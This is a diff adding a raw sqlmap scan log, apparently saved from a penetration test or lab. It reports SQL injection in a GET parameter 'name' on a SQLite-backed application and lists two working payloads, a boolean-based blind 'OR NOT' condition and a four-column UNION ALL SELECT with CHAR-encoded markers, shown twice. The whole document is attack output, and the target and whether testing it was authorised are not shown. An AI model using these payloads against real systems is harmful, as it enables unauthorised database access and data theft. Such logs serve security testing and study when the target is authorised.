@@ -1,0 +1,24 @@
+sqlmap identified the following injection point(s) with a total of 234 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: name=test' OR NOT 4799=4799-- cwKF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,107,113,113)||CHAR(97,87,100,111,108,119,70,104,84,88,110,102,67,115,75,101,105,82,116,84,105,70,110,74,66,76,85,115,108,104,83,103,111,70,76,84,104,115,86,101)||CHAR(113,107,107,106,113),NULL-- fLrk
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: name=test' OR NOT 4799=4799-- cwKF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,107,113,113)||CHAR(97,87,100,111,108,119,70,104,84,88,110,102,67,115,75,101,105,82,116,84,105,70,110,74,66,76,85,115,108,104,83,103,111,70,76,84,104,115,86,101)||CHAR(113,107,107,106,113),NULL-- fLrk
+---
+back-end DBMS: SQLite
